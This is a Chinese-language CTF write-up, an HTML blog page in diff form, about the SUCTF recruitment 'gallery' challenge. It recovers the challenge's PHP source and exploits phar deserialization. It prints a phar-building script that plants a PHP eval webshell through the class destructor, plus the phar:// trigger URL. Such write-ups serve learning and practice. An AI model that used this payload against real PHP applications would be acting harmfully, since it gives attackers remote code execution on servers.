@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,反序列化," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="玩了下SUCTF招新赛，发现有一道phar反序列化的题目还比较有意思，记录一下。Description:A Simple Gallery. Be careful about tips!">
+<meta name="keywords" content="CTF,反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF招新赛-gallery">
+<meta property="og:url" content="http://yoursite.com/2018/11/08/SUCTF招新赛-gallery/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="玩了下SUCTF招新赛，发现有一道phar反序列化的题目还比较有意思，记录一下。Description:A Simple Gallery. Be careful about tips!">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1541653643898.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1541653921381.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1541654768114.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1541656075490.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1541656206623.png">
+<meta property="og:updated_time" content="2018-11-08T05:52:41.166Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SUCTF招新赛-gallery">
+<meta name="twitter:description" content="玩了下SUCTF招新赛，发现有一道phar反序列化的题目还比较有意思，记录一下。Description:A Simple Gallery. Be careful about tips!">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1541653643898.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/08/SUCTF招新赛-gallery/"/>
+
+
+
+
+
+  <title>SUCTF招新赛-gallery | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">This is la vie en rose.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/08/SUCTF招新赛-gallery/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SUCTF招新赛-gallery</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-11-08T13:51:25+08:00">
+                2018-11-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>玩了下SUCTF招新赛，发现有一道phar反序列化的题目还比较有意思，记录一下。<br>Description:A Simple Gallery. Be careful about tips!<a id="more"></a></p>
+<h1 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h1><p>进来题目之后发现有一个上传点，上传上去的如果是图片的话就会被显示在页面上，也符合题目gallery<img src="https://www.github.com/coomrade/Img/raw/master/pics/1541653643898.png" alt="enter description here"></p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>尝试了一下，上传的地方应该是用了白名单，绕不过去，根据题目描述看了下<code>cookie</code>，发现一个<code>hint</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1541653921381.png" alt="enter description here"><code>base64</code>解出来是<code>please read recent papers about phar</code>，phar，我能想到的，要么是找文件包含的点，要么就是反序列化了。然后我扫了一波源码泄露，扫到一个<code>.index.php.swp</code>，拿去<code>vim -r</code>恢复一下，拿到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'./PicManager.php'</span>);</span><br><span class="line">$manager=<span class="keyword">new</span> PicManager(<span class="string">'/var/www/html/sandbox/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'act'</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span>($_GET[<span class="string">'act'</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'upload'</span>:&#123;</span><br><span class="line">            <span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>]==<span class="string">'POST'</span>)&#123;</span><br><span class="line">                $manager-&gt;upload_pic();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'get'</span>:&#123;</span><br><span class="line">            <span class="keyword">print</span> $manager-&gt;get_pic($_GET[<span class="string">'pic'</span>]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'clean'</span>:&#123;</span><br><span class="line">            $manager-&gt;clean();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf8"</span> /&gt;</span><br><span class="line">&lt;title&gt;GALLERY&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"demo.css"</span> /&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"jquery-ui.css"</span> type=<span class="string">"text/css"</span> media=<span class="string">"all"</span> /&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fancybox/jquery.fancybox-1.2.6.css"</span> /&gt;</span><br><span class="line">&lt;script</span><br><span class="line">                          src=<span class="string">"https://code.jquery.com/jquery-3.3.1.min.js"</span></span><br><span class="line">                          integrity=<span class="string">"sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="</span></span><br><span class="line">                          crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script</span><br><span class="line">                          src=<span class="string">"http://code.jquery.com/ui/1.12.0-rc.2/jquery-ui.min.js"</span></span><br><span class="line">                          integrity=<span class="string">"sha256-55Jz3pBCF8z9jBO1qQ7cIf0L+neuPTD1u7Ytzrp2dqo="</span></span><br><span class="line">                          crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"fancybox/jquery.fancybox-1.2.6.pack.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"script.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">"main"</span>&gt;</span><br><span class="line">&lt;h1&gt;Gallery&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;hello <span class="meta">&lt;?</span>=$_SERVER[<span class="string">'REMOTE_ADDR'</span>];<span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;div id=<span class="string">"gallery"</span>&gt;</span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">$stage_width=<span class="number">600</span>;<span class="comment">//放大后的图片宽度</span></span><br><span class="line">$stage_height=<span class="number">400</span>;<span class="comment">//放大后的图片高度</span></span><br><span class="line">$allowed_types=<span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'jpeg'</span>,<span class="string">'gif'</span>,<span class="string">'png'</span>);</span><br><span class="line">$file_parts=<span class="keyword">array</span>();</span><br><span class="line">$ext=<span class="string">''</span>;</span><br><span class="line">$title=<span class="string">''</span>;</span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line">$pics=$manager-&gt;pics();</span><br><span class="line"><span class="keyword">foreach</span> ($pics <span class="keyword">as</span> $file)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>($file==<span class="string">'.'</span> || $file == <span class="string">'..'</span>) <span class="keyword">continue</span>;</span><br><span class="line">        $file_parts = explode(<span class="string">'.'</span>,$file);</span><br><span class="line">        $ext = strtolower(array_pop($file_parts));</span><br><span class="line"><span class="comment">//      $title = implode('.',$file_parts);</span></span><br><span class="line"><span class="comment">//      $title = htmlspecialchars($title);</span></span><br><span class="line">        <span class="keyword">if</span>(in_array($ext,$allowed_types))</span><br><span class="line">        &#123;</span><br><span class="line">                $left=rand(<span class="number">0</span>,$stage_width);</span><br><span class="line">                $top=rand(<span class="number">0</span>,<span class="number">400</span>);</span><br><span class="line">                $rot = rand(<span class="number">-40</span>,<span class="number">40</span>);</span><br><span class="line">                <span class="keyword">if</span>($top&gt;$stage_height<span class="number">-130</span> &amp;&amp; $left &gt; $stage_width<span class="number">-230</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        $top-=<span class="number">120</span>+<span class="number">130</span>;</span><br><span class="line">                        $left-=<span class="number">230</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* 输出各个图片: */</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">                &lt;div id="pic-'</span>.($i++).<span class="string">'" class="pic" style="top:'</span>.$top.<span class="string">'px;left:'</span>.$left.<span class="string">'px;background:url(\'http://'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">':'</span>.$_SERVER[<span class="string">"SERVER_PORT"</span>].<span class="string">'/?act=get&amp;pic='</span>.$file.<span class="string">'\') no-repeat 50% 50%; -moz-transform:rotate('</span>.$rot.<span class="string">'deg); -webkit-transform:rotate('</span>.$rot.<span class="string">'deg);"&gt;</span></span><br><span class="line"><span class="string">                &lt;img src="http://'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/?act=get&amp;pic='</span>.$file.<span class="string">'" target="_blank"/&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;div class="drop-box"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="clear"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"modal"</span> title=<span class="string">"上传图片"</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">"index.php?act=upload"</span> enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">        &lt;!--    &lt;label <span class="keyword">for</span>=<span class="string">"url"</span>&gt;文件：&lt;/label&gt;--&gt;</span><br><span class="line">                &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"url"</span>  onfocus=<span class="string">"this.select()"</span> /&gt;</span><br><span class="line">                &lt;input type=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，<code>act=upload/get/clean</code>分别有不同的功能，页面会把目录下后缀为<code>jpg/jpeg/gif/png</code>的文件给展示出来。很明显这个<code>PicManager.php</code>是有关键代码的，这时候可以发现，<code>act=get</code>是与<code>$_GET[&#39;pic&#39;]</code>一起使用的，这是可控性最高的一个参数，自然想到有可能可以通过这里去读<code>PicManager.php</code>，尝试一下<img src="https://www.github.com/coomrade/Img/raw/master/pics/1541654768114.png" alt="enter description here">拿到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">PicManager</span></span>&#123;</span><br><span class="line">	 <span class="keyword">private</span> $current_dir;</span><br><span class="line">	 <span class="keyword">private</span> $whitelist=[<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.gif'</span>];</span><br><span class="line">	 <span class="keyword">private</span> $logfile=<span class="string">'request.log'</span>;</span><br><span class="line">	 <span class="keyword">private</span> $actions=[];</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($dir)</span></span>&#123;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;current_dir=$dir;</span><br><span class="line">		 <span class="keyword">if</span>(!is_dir($dir))@mkdir($dir);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_log</span><span class="params">($message)</span></span>&#123;</span><br><span class="line">		 array_push(<span class="keyword">$this</span>-&gt;actions,<span class="string">'['</span>.date(<span class="string">'y-m-d h:i:s'</span>,time()).<span class="string">']'</span>.$message);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pics</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;_log(<span class="string">'list pics'</span>);</span><br><span class="line">		 $pics=[];</span><br><span class="line">		 <span class="keyword">foreach</span>(scandir(<span class="keyword">$this</span>-&gt;current_dir) <span class="keyword">as</span> $item)&#123;</span><br><span class="line">			 <span class="keyword">if</span>(in_array(substr($item,<span class="number">-4</span>),<span class="keyword">$this</span>-&gt;whitelist))</span><br><span class="line">				 array_push($pics,<span class="keyword">$this</span>-&gt;current_dir.<span class="string">"/"</span>.$item);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> $pics;</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_pic</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;_log(<span class="string">'upload pic'</span>);</span><br><span class="line">		 $file=$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">		 <span class="keyword">if</span>(!in_array(substr($file,<span class="number">-4</span>),<span class="keyword">$this</span>-&gt;whitelist))&#123;</span><br><span class="line">			 <span class="keyword">$this</span>-&gt;_log(<span class="string">'unsafe deal:upload filename '</span>.$file);</span><br><span class="line">			 <span class="keyword">return</span>;</span><br><span class="line">		 &#125;</span><br><span class="line">		 $newname=md5($file).substr($file,<span class="number">-4</span>);</span><br><span class="line">		 move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="keyword">$this</span>-&gt;current_dir.<span class="string">'/'</span>.$newname);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_pic</span><span class="params">($picname)</span></span>&#123;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;_log(<span class="string">'get pic'</span>);</span><br><span class="line">		 <span class="keyword">if</span>(!file_exists($picname))</span><br><span class="line">			 <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">		 $fi=<span class="keyword">new</span> finfo(FILEINFO_MIME_TYPE);</span><br><span class="line">		 $mime=$fi-&gt;file($picname);</span><br><span class="line">		 header(<span class="string">'Content-Type:'</span>.$mime);</span><br><span class="line">		 <span class="keyword">return</span> file_get_contents($picname);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;_log(<span class="string">'clean'</span>);</span><br><span class="line">		 <span class="keyword">foreach</span>(scandir(<span class="keyword">$this</span>-&gt;current_dir) <span class="keyword">as</span> $file)&#123;</span><br><span class="line">			 @unlink(<span class="keyword">$this</span>-&gt;current_dir.<span class="string">"/"</span>.$file);</span><br><span class="line">		 &#125;</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 $fp=fopen(<span class="keyword">$this</span>-&gt;current_dir.<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;logfile,<span class="string">"a"</span>);</span><br><span class="line">		 <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;actions <span class="keyword">as</span> $act)&#123;</span><br><span class="line">			fwrite($fp,$act.<span class="string">"\n"</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">		 fclose($fp);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$pic=new PicManager('./');</span></span><br><span class="line"><span class="comment">//$pic-&gt;gen();</span></span><br></pre></td></tr></table></figure></p>
+<p>读一下代码</p>
+<ul>
+<li>构造函数用于新建一个基于当前IP的目录</li>
+<li><code>_log</code>用于记录日志信息</li>
+<li><code>pics</code>用于给<code>index.php</code>提供后缀名在白名单中的文件的列表数组</li>
+<li><code>upload_pic</code>用于上传文件，进行了白名单检验</li>
+<li><code>get_pic</code>是这里最关键的一个函数，它调用了好几次文件操作的函数，有一个<code>file_get_contents</code>，这也是为什么我们可以拿到源码。而且我们知道传入的参数是完全可控的，结合<code>phar</code>提示，自然想到phar反序列化</li>
+<li><code>clean</code>用于清空目录</li>
+<li><code>__destruct</code>用于记录日志，其中写入日志文件的内容以及日志文件的名字，都是类中定义的</li>
+</ul>
+<p>思路变得清晰了，我们只需要通过phar触发反序列化漏洞，把日志文件的名字和内容改一下，就能写入webshell.关于phar反序列化，可以看我之前写的一篇<a href="https://coomrade.github.io/2018/09/11/phar-unser/#more" target="_blank" rel="noopener">文章</a>。<br>构造phar:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">PicManager</span></span>&#123;</span><br><span class="line">	 <span class="keyword">private</span> $current_dir;</span><br><span class="line">	 <span class="keyword">private</span> $whitelist=[<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.gif'</span>];</span><br><span class="line">	 <span class="keyword">private</span> $logfile=<span class="string">'request.php'</span>;</span><br><span class="line">	 <span class="keyword">private</span> $actions=<span class="keyword">array</span>(<span class="string">'&lt;?php eval($_POST["comrade"]);phpinfo();?&gt;'</span>);</span><br><span class="line">	.....</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar=<span class="keyword">new</span> Phar(<span class="string">'shell3.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'te.txt'</span>,<span class="string">'asd'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$o=<span class="keyword">new</span> PicManager(<span class="string">'/var/www/html/sandbox/e69048d0f58028846b8d591a353e1822'</span>);</span><br><span class="line">$phar-&gt;setMetaData($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p>
+<p>然后把后缀名改成gif，上传<img src="https://www.github.com/coomrade/Img/raw/master/pics/1541656075490.png" alt="enter description here">顺便拿到路径。然后用<code>phar</code>协议包含<code>http://49.4.68.67:86/index.php?act=get&amp;pic=phar:///var/www/html/sandbox/e69048d0f58028846b8d591a353e1822/40b19cbbedcda702a5300c370ee57729.gif/ds</code>，最后，访问相应目录下的webshell，get flag。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1541656206623.png" alt="enter description here">直接给了flag，缺了点仪式感。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
